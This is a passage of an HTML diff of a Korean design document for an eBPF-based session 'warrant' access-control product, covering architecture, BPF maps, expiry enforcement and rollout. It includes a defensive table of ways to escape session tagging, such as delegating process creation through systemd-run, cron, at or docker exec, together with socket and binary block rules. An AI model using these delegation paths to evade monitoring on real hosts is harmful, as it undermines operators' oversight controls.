+    <p>진짜 구멍은 훨씬 좁다. <strong>영장 세션 안에서, 프로세스를 자기가 fork하지 않고 다른 데몬에게 만들어 달라고 요청하는 경우</strong>다. 이때만 fork 관계가 끊겨 2차 방어선인 <code>task_warrant</code> 전파까지 무력해진다. 두 겹으로 붙인 덕분에 “cgroup만 바뀌는” 형태는 이미 걸린다.</p>
+
+    <div class="table-scroll">
+      <table>
+        <thead><tr><th>세션에서 하는 행위</th><th>프로세스를 만드는 주체</th><th>cgroup</th><th>fork 체인</th><th>태그</th></tr></thead>
+        <tbody>
+          <tr>
+            <td class="mono">nohup · setsid · &amp;</td>
+            <td class="dim">세션 자신</td>
+            <td class="dim">유지</td><td class="dim">유지</td>
+            <td class="name" style="color:var(--accent-ink)">유지</td>
+          </tr>
+          <tr>
+            <td class="mono">sudo · su</td>
+            <td class="dim">세션 자신</td>
+            <td class="dim">유지</td><td class="dim">유지</td>
+            <td class="name" style="color:var(--accent-ink)">유지</td>
+          </tr>
+          <tr>
+            <td class="mono">systemd-run --scope</td>
+            <td class="dim">호출자 자신이 fork 후 이관</td>
+            <td class="dim">바뀜</td><td class="dim">유지</td>
+            <td class="name" style="color:var(--accent-ink)">유지 — 2차 방어선</td>
+          </tr>
+          <tr>
+            <td class="mono">systemd-run (기본)</td>
+            <td class="dim">PID 1</td>
+            <td class="dim">바뀜</td><td class="dim">끊김</td>
+            <td class="name" style="color:var(--deny)">끊김</td>
+          </tr>
+          <tr>
+            <td class="mono">systemctl start</td>
+            <td class="dim">PID 1</td>
+            <td class="dim">바뀜</td><td class="dim">끊김</td>
+            <td class="name" style="color:var(--deny)">끊김</td>
+          </tr>
+          <tr>
+            <td class="mono">at · crontab</td>
+            <td class="dim">atd · crond</td>
+            <td class="dim">바뀜</td><td class="dim">끊김</td>
+            <td class="name" style="color:var(--deny)">끊김</td>
+          </tr>
+          <tr>
+            <td class="mono">docker exec</td>
+            <td class="dim">containerd-shim</td>
+            <td class="dim">바뀜</td><td class="dim">끊김</td>
+            <td class="name" style="color:var(--deny)">끊김</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <h3>남는 위임 경로는 세 겹으로 막는다</h3>
+    <ul>
+      <li><b>실행 허용 목록이 화이트리스트다.</b> <code>systemd-run</code>·<code>systemctl</code>·<code>at</code>·<code>crontab</code>·<code>docker</code>가 영장에 없으면 실행 자체가 <code>bprm_check_security</code>에서 막힌다. <strong>기본값이 이미 차단</strong>이라는 게 핵심이다 — 구멍을 쓰려면 먼저 그 바이너리를 실행해야 하는데 그 문이 닫혀 있다.</li>
+      <li><b>소켓을 막는다.</b> <code>lsm/socket_connect</code>는 AF_UNIX도 지나가므로 <code>sun_path</code>를 보고 <code>/run/systemd/private</code>, <code>/run/dbus/system_bus_socket</code>, <code>docker.sock</code>으로의 연결을 차단한다. 바이너리를 우회해 D-Bus 프로토콜을 직접 짜는 경우까지 걸린다.</li>
+      <li><b>spool 쓰기는 이미 막혀 있다.</b> <code>at</code>·<code>cron</code>은 <code>/var/spool/</code>에 파일을 쓰는 방식이라, read-only 영장에서는 별도 규칙 없이 자동으로 차단된다.</li>
+    </ul>
+
+    <div class="callout warn">
+      <span class="ct">정책 설계 원칙</span>
+      <p><strong>실행 허용 목록과 쓰기 허용 목록은 반드시 함께 검토해야 한다.</strong> 운영상 <code>systemctl restart</code>를 허용해야 하는 영장이라면, <code>/etc/systemd/system</code> 쓰기를 같이 열어주는 순간 임의 코드 실행 경로가 생긴다. 둘 중 하나만 보고는 안전을 보장할 수 없다. 정책 컴파일러가 이 조합을 자동으로 경고해야 한다.</p>
+    </div>
+
+    <p>완전한 봉쇄는 Phase 2다. <code>warrantd</code>가 systemd의 D-Bus 시그널(<code>JobNew</code>·<code>UnitNew</code>)을 구독해, transient unit을 요청한 pid가 태그된 프로세스였는지 확인하고 <strong>새로 만들어진 scope cgroup에 같은 영장을 승계</strong>한다. 요청과 유닛 생성 사이에 짧은 레이스가 있어 100%는 아니지만, 위임 경로 대부분을 덮는다. 같은 방식이 <code>docker.sock</code>에도 적용된다 — 소켓 피어의 태그를 보고 새 컨테이너 cgroup에 영장을 잇는다.</p>
+  </section>
+
+  <div class="part"><span class="pn">Part II</span><span class="pt">기획</span></div>
+
+  <section class="first">
+    <div class="sec-head"><span class="num">05</span><h2 class="h">만료가 세션 안에서 발효된다</h2></div>
+
+    <p class="lede">이게 기존 JIT 접근제어와 갈리는 지점이다. Teleport·StrongDM 계열의 임시 권한은 <strong>다음 접속</strong>을 막는다. 이미 열려 있는 세션, 특히 그 세션이 백그라운드로 남긴 프로세스는 대개 그대로 살아남는다.</p>
+
+    <p>영장은 커널 맵 안에 만료 시각을 들고 있고, LSM 훅은 매 판정마다 <code>bpf_ktime_get_boot_ns()</code>와 비교한다. 유저 공간 왕복도, 프로세스에 신호를 보내는 절차도 없다. <strong>14:30이 되는 순간, 그 세션과 그 세션이 낳은 모든 프로세스가 동시에 권한을 잃는다.</strong> 취소도 같은 원리라, 맵의 바이트 하나를 뒤집으면 전 노드에서 즉시 발효된다.</p>
+
+    <div class="callout warn">
+      <span class="ct">기본값은 죽이지 않는다</span>
+      <p>만료 시 프로세스를 <code>SIGKILL</code> 하고 싶은 유혹이 크지만, 티켓이 끝났다고 운영 배치 작업을 죽이면 그 제품은 그날로 꺼진다. 기본 동작은 <strong>권한 강등 + 알림</strong>이다. 쓰기와 아웃바운드만 잠기고 프로세스는 산다. 강제 종료는 명시적으로 켜는 옵션으로 둔다.</p>
+    </div>
+  </section>
+
+  <section>
+    <div class="sec-head"><span class="num">06</span><h2 class="h">구멍을 먼저 말한다</h2></div>
+
+    <div class="split">
+      <div class="pane can">
+        <h4>실제로 막힌다</h4>
+        <ul>
+          <li><b>권한 남용</b> — 장애 대응으로 받은 접속으로 다른 걸 하는 행위</li>
+          <li><b>데이터 반출</b> — 세션에서 나가는 아웃바운드와 <code>scp</code> 경로 차단</li>
+          <li><b>귀속 세탁</b> — <code>sudo</code> 뒤로 숨는 것이 불가능해진다</li>
+          <li><b>유령 접속</b> — 영장 없이 성공한 인증을 호스트가 거부하거나 즉시 신고</li>
+          <li><b>기간 초과</b> — 승인 30분이 실제로 30분이 된다</li>
+        </ul>
+      </div>
+      <div class="pane cant">
+        <h4>못 막는다</h4>
+        <ul>
+          <li><b>다른 데몬을 통한 위임</b> — <code>systemd-run</code>·cron. 정책으로 봉쇄하되 완전하지 않다</li>
+          <li><b>커널 익스플로잇</b> — 심판을 무너뜨리면 판정도 없다</li>
+          <li><b>영장이 넓은 경우</b> — 범위가 “전부 허용”이면 아무것도 통제하지 않는다</li>
+          <li><b>에이전트 로드 이전의 root</b> — 부팅 경로가 이미 장악됐다면 무의미하다</li>
+        </ul>
+      </div>
+    </div>
+
+    <p>정직한 포지셔닝은 이렇다. <strong>“root를 없애는 제품”이 아니라 “root가 하는 일에 사유와 기한을 붙이는 제품”이다.</strong> 마음먹은 커널 공격자를 가두지는 못한다. 대신 정상 경로로 들어온 사람이 승인받은 범위를 벗어나는 것을 실제로 막고, 그 기록을 위조하기 어렵게 만든다. 접근통제 제품이 현실에서 요구받는 건 대부분 후자다.</p>
+  </section>
+
+  <section>
+    <div class="sec-head"><span class="num">07</span><h2 class="h">도입 사다리 — 감사부터, 재부팅은 나중에</h2></div>
+
+    <p>가장 큰 도입 마찰은 기술이 아니다. BPF LSM 강제는 <code>lsm=…,bpf</code> 부트 파라미터를 요구하고, 이건 재부팅이다. 다행히 이 제품은 <strong>강제 이전 단계가 그 자체로 팔린다.</strong></p>
+
+    <div class="steps">
+      <div class="step">
+        <div class="step-tag">STEP 1</div>
+        <div>
+          <h3>감사 모드 — 재부팅 없음</h3>
+          <p>LSM 없이 kprobe만으로 “누가, 어떤 티켓으로, 어느 서버에서, 무엇을 실행하고 어디로 접속했는지”가 컨테이너 내부까지 사람 이름표를 달고 쌓인다. <code>auditd</code>가 하지 못하던 조직 신원 매핑과 컨테이너 커버리지가 여기서 나온다.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-tag">STEP 2</div>
+        <div>
+          <h3>영장 없는 접속 탐지</h3>
+          <p>게이트웨이를 우회한 접속을 호스트에서 잡아낸다. “우리 회사 SSH는 전부 통제되고 있다”는 믿음이 사실인지 처음으로 측정된다. 이 리포트 한 장이 보통 구매 결정을 만든다.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-tag">STEP 3</div>
+        <div>
+          <h3>드라이런 강제</h3>
+          <p>정책을 얹되 차단은 로그만. 감사 모드 데이터로 만든 최소 권한 초안이 실제 업무를 방해하지 않는지 확인한다.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-tag">STEP 4</div>
+        <div>
+          <h3>강제</h3>
+          <p>재부팅을 요구할 근거가 이 시점엔 이미 데이터로 쌓여 있다. 카테고리 단위로 하나씩 켜고, 킬스위치는 커널 맵 플래그 하나로 둔다.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section>
+    <div class="sec-head"><span class="num">08</span><h2 class="h">왜 지금, 왜 이 제품인가</h2></div>
+
+    <ul>
+      <li><b>규제가 이미 요구하고 있다.</b> ISMS-P, 전자금융감독규정, PCI-DSS, SOC 2 모두 특권 계정 접근통제와 접속기록 보존을 명시적으로 요구한다. “있으면 좋은 것”이 아니라 감사에서 지적받는 항목이고, <strong>예산 항목이 이미 존재한다.</strong></li>
+      <li><b>기존 제품을 걷어내지 않아도 된다.</b> 게이트웨이는 문 앞, 이 제품은 문 안쪽이다. 대체가 아니라 보완이라 도입 저항이 낮고, 이미 게이트웨이를 산 조직이 오히려 1순위 고객이다.</li>
+      <li><b>감사 모드만으로도 값이 매겨진다.</b> 강제까지 못 가더라도 제품이 미완성이 아니다. 이런 구조를 가진 보안 제품은 드물다.</li>
+      <li><b>기술 난이도가 낮다.</b> 호출 스택 계측도, 프로토콜 파싱도 필요 없다. cgroup id 조회와 fork 전파, LSM 훅 몇 개면 코어가 선다.</li>
+    </ul>
+
+    <div class="callout">
+      <span class="ct">검증 질문 하나</span>
+      <p><strong>“지금 우리 회사에 영장 없는 SSH 세션이 하루 몇 건이나 있나?”</strong> 감사 모드 2주면 답이 나온다. 그 숫자가 0이 아닌 조직에게는 그 이상 설명이 필요 없고, 0인 조직은 애초에 고객이 아니다. 제품 검증과 영업 자료가 같은 데이터에서 나온다.</p>
+    </div>
+  </section>
+
+  <section>
+    <div class="sec-head"><span class="num">09</span><h2 class="h">MVP</h2></div>
+
+    <ul>
+      <li><b>2개월 — 감사 모드</b> PAM 모듈 + cgroup 태깅 + exec/connect/file 이벤트에 영장 부착. 재부팅 불필요</li>
+      <li><b>+1개월 — 영장 없는 접속 탐지</b> 그리고 조직 전체 SSH 접속 현황 리포트</li>
+      <li><b>+2개월 — 강제</b> <code>bprm_check_security</code>, <code>file_open</code>, <code>socket_connect</code> 3종. 만료·취소 즉시 발효</li>
+      <li><b>승인 연동</b> Slack 승인 → 영장 발급까지. 이 흐름이 없으면 아무도 안 쓴다</li>
+    </ul>
+
+    <p>선행 검증이 필요한 건 세 가지다. <strong>PAM 스택에서 session scope가 확정되는 타이밍</strong>, <strong><code>file_open</code> 훅의 실측 오버헤드</strong>, <strong>inode 갱신 추적의 안정성</strong>. 이 중 두 번째가 가장 위험하므로 PoC는 여기서부터 시작한다.</p>
+  </section>
+
+  <div class="part"><span class="pn">Part III</span><span class="pt">아키텍처</span></div>
+
+  <section class="first">
+    <div class="sec-head"><span class="num">10</span><h2 class="h">세 개의 평면</h2></div>
+
+    <p class="lede">구조는 단순하다. <strong>중앙은 영장을 발급하고, 노드의 유저 공간은 그것을 커널 맵에 옮겨 적고, 커널은 그 맵만 보고 판정한다.</strong> 판정 시점에 유저 공간으로 올라오는 왕복이 하나도 없다는 게 이 설계의 핵심이다.</p>
+
+    <figure>
+      <div class="fig-shell">
+        <svg viewBox="0 0 840 452" role="img" aria-label="컨트롤 플레인이 영장을 발급해 노드의 warrantd로 보내고, warrantd가 BPF 맵에 기록하면, 커널의 BPF 프로그램이 세션 프로세스의 syscall을 맵만 조회해 판정하고 감사 이벤트를 ringbuf로 되돌려 보내는 3계층 구조">
+          <defs>
+            <marker id="d-ar" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+              <path d="M 0 0 L 10 5 L 0 10 z" fill="currentColor"/>
+            </marker>
+            <marker id="d-arA" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+              <path d="M 0 0 L 10 5 L 0 10 z" fill="#1E5A3C"/>
+            </marker>
+          </defs>
+
+          <line x1="130" y1="126" x2="830" y2="126" stroke="currentColor" stroke-width="1" stroke-dasharray="4 5" opacity="0.3"/>
+          <line x1="130" y1="292" x2="830" y2="292" stroke="currentColor" stroke-width="1" stroke-dasharray="4 5" opacity="0.3"/>
+
+          <text class="m" x="118" y="60"  text-anchor="end" font-size="11" fill="currentColor" opacity="0.6">컨트롤 플레인</text>
+          <text class="m" x="118" y="212" text-anchor="end" font-size="11" fill="currentColor" opacity="0.6">노드 · 유저 공간</text>
+          <text class="m" x="118" y="362" text-anchor="end" font-size="11" fill="currentColor" opacity="0.6">노드 · 커널</text>
+
+          <rect x="140" y="30" width="210" height="56" rx="5" fill="none" stroke="currentColor" stroke-width="1.25" opacity="0.75"/>
+          <text x="245" y="55" text-anchor="middle" font-size="12.5" fill="currentColor">감사 저장소</text>
+          <text class="m" x="245" y="72" text-anchor="middle" font-size="10.5" fill="currentColor" opacity="0.6">warrant_id → 사람</text>
+
+          <rect x="470" y="30" width="250" height="56" rx="5" fill="none" stroke="#1E5A3C" stroke-width="1.5"/>
+          <text x="595" y="55" text-anchor="middle" font-size="12.5" fill="currentColor">영장 발급 · 승인 · 신원</text>
+          <text class="m" x="595" y="72" text-anchor="middle" font-size="10.5" fill="currentColor" opacity="0.6">Ed25519 서명</text>
+
+          <rect x="140" y="160" width="110" height="48" rx="4" fill="none" stroke="currentColor" stroke-width="1.25" opacity="0.75"/>
+          <text class="m" x="195" y="189" text-anchor="middle" font-size="12" fill="currentColor">sshd</text>
+
+          <rect x="268" y="160" width="150" height="48" rx="4" fill="none" stroke="currentColor" stroke-width="1.25" opacity="0.75"/>
+          <text class="m" x="343" y="189" text-anchor="middle" font-size="12" fill="currentColor">pam_warrant.so</text>
+
+          <rect x="140" y="224" width="278" height="46" rx="4" fill="none" stroke="currentColor" stroke-width="1.25" opacity="0.55"/>
+          <text class="m" x="279" y="252" text-anchor="middle" font-size="11.5" fill="currentColor" opacity="0.85">세션 프로세스 — bash · sudo · vim</text>
+
+          <rect x="470" y="150" width="250" height="90" rx="5" fill="none" stroke="#1E5A3C" stroke-width="1.5"/>
+          <text class="m" x="595" y="176" text-anchor="middle" font-size="12.5" fill="currentColor" font-weight="600">warrantd</text>
+          <text x="595" y="196" text-anchor="middle" font-size="11" fill="currentColor" opacity="0.7">정책 컴파일 · 맵 관리</text>
+          <text x="595" y="213" text-anchor="middle" font-size="11" fill="currentColor" opacity="0.7">ringbuf 소비 · 킬스위치</text>
+          <text class="m" x="595" y="230" text-anchor="middle" font-size="10" fill="currentColor" opacity="0.5">영장 캐시 (중앙 단절 대비)</text>
+
+          <rect x="140" y="300" width="278" height="120" rx="5" fill="none" stroke="currentColor" stroke-width="1.4"/>
+          <text class="m" x="279" y="324" text-anchor="middle" font-size="12" fill="currentColor" font-weight="600">BPF 맵</text>
+          <text class="m" x="160" y="346" font-size="10.5" fill="currentColor" opacity="0.7">cgroup_warrant · task_warrant</text>
+          <text class="m" x="160" y="364" font-size="10.5" fill="currentColor" opacity="0.7">warrants (만료 · 취소 · 모드)</text>
+          <text class="m" x="160" y="382" font-size="10.5" fill="currentColor" opacity="0.7">rule_exec · rule_write · rule_net</text>
+          <text class="m" x="160" y="400" font-size="10.5" fill="currentColor" opacity="0.7">events (ringbuf)</text>
+
+          <rect x="450" y="300" width="370" height="120" rx="5" fill="none" stroke="currentColor" stroke-width="1.4"/>
+          <text class="m" x="635" y="324" text-anchor="middle" font-size="12" fill="currentColor" font-weight="600">BPF 프로그램</text>
+          <text class="m" x="470" y="346" font-size="10.5" fill="currentColor" opacity="0.7">lsm/bprm_check_security — exec</text>
+          <text class="m" x="470" y="364" font-size="10.5" fill="currentColor" opacity="0.7">lsm/file_open · inode_unlink — write</text>
+          <text class="m" x="470" y="382" font-size="10.5" fill="currentColor" opacity="0.7">lsm/socket_connect — egress</text>
+          <text class="m" x="470" y="400" font-size="10.5" fill="currentColor" opacity="0.7">tp/sched_process_fork — 태그 전파</text>
+
+          <line x1="595" y1="86" x2="595" y2="146" stroke="#1E5A3C" stroke-width="1.4" marker-end="url(#d-arA)"/>
+          <text class="m" x="605" y="118" font-size="10.5" fill="#1E5A3C">영장 push</text>
+
+          <line x1="486" y1="150" x2="330" y2="90" stroke="currentColor" stroke-width="1.1" opacity="0.55" marker-end="url(#d-ar)"/>
+          <text class="m" x="404" y="112" text-anchor="middle" font-size="10.5" fill="currentColor" opacity="0.65">감사 이벤트</text>
+
+          <line x1="250" y1="184" x2="264" y2="184" stroke="currentColor" stroke-width="1.1" opacity="0.55" marker-end="url(#d-ar)"/>
+          <line x1="418" y1="184" x2="466" y2="184" stroke="currentColor" stroke-width="1.1" opacity="0.55" marker-end="url(#d-ar)"/>
+          <text class="m" x="442" y="176" text-anchor="middle" font-size="10" fill="currentColor" opacity="0.65">바인딩</text>
+
+          <line x1="195" y1="208" x2="195" y2="222" stroke="currentColor" stroke-width="1.1" opacity="0.55" marker-end="url(#d-ar)"/>
+
+          <line x1="560" y1="240" x2="560" y2="298" stroke="#1E5A3C" stroke-width="1.4" marker-end="url(#d-arA)"/>
+          <text class="m" x="570" y="272" font-size="10.5" fill="#1E5A3C">맵 write</text>
+
+          <line x1="350" y1="270" x2="470" y2="298" stroke="currentColor" stroke-width="1.1" opacity="0.55" marker-end="url(#d-ar)"/>
+          <text class="m" x="380" y="290" font-size="10.5" fill="currentColor" opacity="0.65">syscall</text>
+
+          <line x1="448" y1="360" x2="422" y2="360" stroke="currentColor" stroke-width="1.1" opacity="0.55" marker-end="url(#d-ar)"/>
+
+          <line x1="700" y1="298" x2="668" y2="244" stroke="currentColor" stroke-width="1.1" opacity="0.55" marker-end="url(#d-ar)"/>
+          <text class="m" x="706" y="278" font-size="10.5" fill="currentColor" opacity="0.65">ringbuf</text>
+        </svg>
+      </div>
+      <figcaption>초록 화살표가 영장이 흐르는 경로다. <strong>중앙 → warrantd → BPF 맵</strong>에서 끝나고, 그 뒤로는 커널이 혼자 판정한다. 그래서 중앙이 끊겨도, warrantd가 죽어도 이미 발급된 영장의 만료와 강제는 정확히 계속된다.</figcaption>
+    </figure>
+
+    <p><code>warrantd</code>가 죽어도 훅이 유지되도록 BPF 프로그램과 맵은 <code>bpffs</code>에 pin한다. 재시작 중에도 태깅 공백이 생기지 않고, 유저 공간의 버그가 강제를 무너뜨리지 않는다. 부팅 순서는 <code>Before=sshd.service</code>로 고정한다 — 그렇지 않으면 부팅 직후 들어온 세션이 태그 없이 시작된다.</p>
+  </section>
+
+  <section>
+    <div class="sec-head"><span class="num">11</span><h2 class="h">영장의 일생</h2></div>
+
+    <div class="steps">
+      <div class="step">
+        <div class="step-tag">T0 · 발급</div>
+        <div>
+          <h3>승인 → 서명된 영장</h3>
+          <p>Slack 승인이 떨어지면 중앙이 <code>warrant_id</code>, 주체, 대상 호스트, 만료 시각, 정책을 담아 서명한다. 해당 호스트의 <code>warrantd</code>로 push되고, warrantd는 <strong>정책을 맵에 들어갈 형태로 컴파일</strong>한다 — 허용 바이너리는 inode 키로, 허용 대역은 LPM 트라이 엔트리로, 쓰기 가능 디렉터리는 warrantd가 직접 만들고 그 inode를 등록한다.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-tag">T1 · 바인딩</div>
+        <div>
+          <h3>로그인 시점에 cgroup에 못 박는다</h3>
+          <p><code>pam_warrant.so</code>가 sshd의 PAM 스택에서 실행된다. <code>account</code> 단계에서 유효한 영장 유무를 확인하고, <code>session</code> 단계에서 <code>XDG_SESSION_ID</code>로 확정된 <code>session-N.scope</code>의 cgroup id를 읽어 <code>cgroup_warrant[cgroup_id] = warrant_id</code>를 쓴다. <strong>PAM 스택에서 <code>pam_systemd.so</code>보다 뒤에 놓여야 한다</strong> — 그 전에는 scope가 아직 없다.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-tag">T2 · 집행</div>
+        <div>
+          <h3>맵만 보고 판정</h3>
+          <p>세션이 만드는 모든 프로세스는 같은 cgroup 안에서 태어난다. <code>sudo</code>로 uid가 바뀌어도 cgroup은 그대로다. LSM 훅은 §13의 경로대로 판정하고, 결과를 ringbuf에 남긴다.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-tag">T3 · 만료</div>
+        <div>
+          <h3>유저 공간 개입 없이</h3>
+          <p>훅이 매 판정마다 <code>bpf_ktime_get_boot_ns()</code>를 <code>expires_ns</code>와 비교한다. 타이머도, 프로세스 순회도, 신호도 없다. 취소는 <code>warrants[id].revoked = 1</code> 한 바이트로 즉시 발효된다.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-tag">T4 · 정리</div>
+        <div>
+          <h3>cgroup이 사라질 때</h3>
+          <p>세션 종료로 scope가 없어지면 <code>cgroup_warrant</code> 엔트리를 지운다. 다만 <code>nohup</code>으로 살아남은 프로세스는 <code>task_warrant</code> 쪽 태그를 계속 들고 있어 영장의 통제를 받는다 — 이게 의도된 동작이다.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section>
+    <div class="sec-head"><span class="num">12</span><h2 class="h">커널 안의 자료구조</h2></div>
+
+    <div class="table-scroll">
+      <table>
+        <thead><tr><th>맵</th><th>타입</th><th>키 → 값</th><th>역할</th></tr></thead>
+        <tbody>
+          <tr><td class="mono">active_flag</td><td class="mono">PERCPU_ARRAY</td><td class="mono">0 → u8</td><td class="dim">이 노드에 활성 영장이 없으면 모든 훅이 즉시 통과. 평시 오버헤드를 0에 가깝게 만드는 장치</td></tr>
+          <tr><td class="mono">cgroup_warrant</td><td class="mono">HASH</td><td class="mono">cgroup_id → warrant_id</td><td class="dim">1차 바인딩. sudo·su와 무관하게 유지된다</td></tr>
+          <tr><td class="mono">task_warrant</td><td class="mono">TASK_STORAGE</td><td class="mono">task → warrant_id</td><td class="dim">2차 바인딩. fork 시 부모 값을 복사해 cgroup 밖으로 나간 경우를 메운다</td></tr>
+          <tr><td class="mono">warrants</td><td class="mono">HASH</td><td class="mono">warrant_id → struct</td><td class="dim">만료 시각, 주체 id, 정책 id, 취소 플래그, 모드(observe·dryrun·enforce)</td></tr>
+          <tr><td class="mono">rule_exec</td><td class="mono">HASH</td><td class="mono">(policy, inode) → u8</td><td class="dim">실행 허용 바이너리</td></tr>
+          <tr><td class="mono">rule_write</td><td class="mono">HASH</td><td class="mono">(policy, inode) → u8</td><td class="dim">쓰기 허용 디렉터리</td></tr>
+          <tr><td class="mono">rule_net</td><td class="mono">LPM_TRIE</td><td class="mono">(policy, CIDR) → u8</td><td class="dim">아웃바운드 허용 대역</td></tr>
+          <tr><td class="mono">events</td><td class="mono">RINGBUF</td><td class="mono">→ 감사 레코드</td><td class="dim">판정 결과. warrantd가 소비해 중앙으로</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+<pre><b>struct warrant</b> {
+    __u64 expires_ns;      <i>// bpf_ktime_get_boot_ns 기준</i>
+    __u64 grace_ns;        <i>// on_expiry=2일 때 유예 시한 (만료 후 추가 시간)</i>
+    __u32 subject_id;      <i>// paul@seswar.io 의 정수 id</i>
+    __u32 policy_id;       <i>// rule_* 조회 키의 앞부분</i>
+    __u8  revoked;         <i>// 1바이트로 즉시 취소</i>
+    __u8  mode;            <i>// 0 observe · 1 dryrun · 2 enforce</i>
+    __u8  on_expiry;       <i>// 0 강등 · 1 강제종료 · 2 세션만 종료+유예 (§03)</i>
+};</pre>
+
+    <p><code>mode</code>가 영장마다 붙어 있는 게 중요하다. 노드 전체를 한 번에 강제로 전환하는 게 아니라 <strong>영장 단위로 dry-run을 섞을 수 있다.</strong> 새 정책을 쓰는 팀만 dry-run으로 두고 나머지는 강제로 두는 운용이 가능해진다.</p>
+  </section>
+
+  <section>
+    <div class="sec-head"><span class="num">13</span><h2 class="h">syscall 하나가 도착했을 때</h2></div>
+
+    <p class="lede">전체 설계에서 성능이 걸리는 곳은 여기 하나다. <strong>영장이 없는 프로세스는 맵 조회 한 번으로 빠져나가야 한다.</strong> 노드에서 벌어지는 일의 99.9%가 이 경로다.</p>
+
+    <figure>
+      <div class="fig-shell">
+        <svg viewBox="0 0 720 520" role="img" aria-label="LSM 훅에 syscall이 도착했을 때 활성 플래그 확인, cgroup 조회, task storage 조회, 영장 조회, 만료 검사, 규칙 조회, 감사 기록, 최종 허용 또는 차단으로 이어지는 판정 순서와 세 개의 조기 통과 분기">
+          <defs>
+            <marker id="p-ar" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+              <path d="M 0 0 L 10 5 L 0 10 z" fill="currentColor"/>
+            </marker>
+          </defs>
+
+          <g fill="none" stroke="currentColor" stroke-width="1.25" opacity="0.55">
+            <line x1="205" y1="60"  x2="205" y2="80"  marker-end="url(#p-ar)"/>
+            <line x1="205" y1="122" x2="205" y2="142" marker-end="url(#p-ar)"/>
+            <line x1="205" y1="184" x2="205" y2="204" marker-end="url(#p-ar)"/>
+            <line x1="205" y1="246" x2="205" y2="266" marker-end="url(#p-ar)"/>
+            <line x1="205" y1="308" x2="205" y2="328" marker-end="url(#p-ar)"/>
+            <line x1="205" y1="370" x2="205" y2="390" marker-end="url(#p-ar)"/>
+            <line x1="205" y1="432" x2="205" y2="452" marker-end="url(#p-ar)"/>
+            <line x1="360" y1="40"  x2="426" y2="40"  marker-end="url(#p-ar)"/>
+            <line x1="360" y1="164" x2="426" y2="164" marker-end="url(#p-ar)"/>
+            <line x1="360" y1="288" x2="426" y2="288" marker-end="url(#p-ar)"/>
+          </g>
+
+          <rect x="50" y="20" width="310" height="40" rx="4" fill="none" stroke="currentColor" stroke-width="1.4"/>
+          <text class="m" x="205" y="45" text-anchor="middle" font-size="12" fill="currentColor">① active_flag (per-CPU)</text>
+
+          <rect x="50" y="82" width="310" height="40" rx="4" fill="none" stroke="currentColor" stroke-width="1.25" opacity="0.8"/>
+          <text class="m" x="205" y="107" text-anchor="middle" font-size="12" fill="currentColor">② cgroup_id → cgroup_warrant</text>
+
+          <rect x="50" y="144" width="310" height="40" rx="4" fill="none" stroke="currentColor" stroke-width="1.25" opacity="0.8"/>
+          <text class="m" x="205" y="169" text-anchor="middle" font-size="12" fill="currentColor">③ miss → task_warrant</text>
+
+          <rect x="50" y="206" width="310" height="40" rx="4" fill="none" stroke="currentColor" stroke-width="1.25" opacity="0.8"/>
+          <text class="m" x="205" y="231" text-anchor="middle" font-size="12" fill="currentColor">④ warrants — 주체 · 정책 · 만료</text>
+
+          <rect x="50" y="268" width="310" height="40" rx="4" fill="none" stroke="currentColor" stroke-width="1.25" opacity="0.8"/>
+          <text class="m" x="205" y="293" text-anchor="middle" font-size="12" fill="currentColor">⑤ 취소 · 만료 검사</text>
+
+          <rect x="50" y="330" width="310" height="40" rx="4" fill="none" stroke="currentColor" stroke-width="1.25" opacity="0.8"/>
+          <text class="m" x="205" y="355" text-anchor="middle" font-size="12" fill="currentColor">⑥ rule_exec · rule_write · rule_net</text>
+
+          <rect x="50" y="392" width="310" height="40" rx="4" fill="none" stroke="currentColor" stroke-width="1.25" opacity="0.8"/>
+          <text class="m" x="205" y="417" text-anchor="middle" font-size="12" fill="currentColor">⑦ 감사 레코드 → ringbuf</text>
+
+          <rect x="50" y="454" width="310" height="40" rx="4" fill="none" stroke="#B33A32" stroke-width="1.5"/>
+          <text class="m" x="205" y="479" text-anchor="middle" font-size="12" fill="#B33A32">⑧ enforce &amp;&amp; deny → -EPERM</text>
+
+          <rect x="428" y="22" width="262" height="36" rx="4" fill="none" stroke="currentColor" stroke-width="1" opacity="0.45"/>
+          <text x="559" y="45" text-anchor="middle" font-size="11.5" fill="currentColor" opacity="0.75">활성 영장 없음 → 즉시 통과</text>
+
+          <rect x="428" y="146" width="262" height="36" rx="4" fill="none" stroke="currentColor" stroke-width="1" opacity="0.45"/>
+          <text x="559" y="169" text-anchor="middle" font-size="11.5" fill="currentColor" opacity="0.75">관리 대상 아님 → 통과</text>
+
+          <rect x="428" y="270" width="262" height="36" rx="4" fill="none" stroke="currentColor" stroke-width="1" opacity="0.45"/>
+          <text x="559" y="293" text-anchor="middle" font-size="11.5" fill="currentColor" opacity="0.75">만료 → 강등 규칙으로 판정</text>
+        </svg>
+      </div>
+      <figcaption>①에서 빠져나가는 경로가 노드 활동의 대부분이다. per-CPU 배열 조회 하나라 수 나노초 수준이고, 영장이 걸린 세션만 ②~⑧을 탄다. 전체 판정은 <strong>해시 조회 서너 번과 정수 비교 몇 개</strong>로 끝나며, 어떤 경우에도 유저 공간으로 올라가지 않는다.</figcaption>
+    </figure>
+
+    <p>⑦의 감사 기록에는 절제가 필요하다. 차단은 전부 남기고, 허용은 <code>exec</code>과 <code>connect</code>처럼 빈도가 낮은 것만 남긴다. 쓰기 허용까지 전부 남기면 ringbuf가 넘친다.</p>
+  </section>
+
+  <section>
+    <div class="sec-head"><span class="num">14</span><h2 class="h">감사 기록에 무엇이 남는가</h2></div>
+
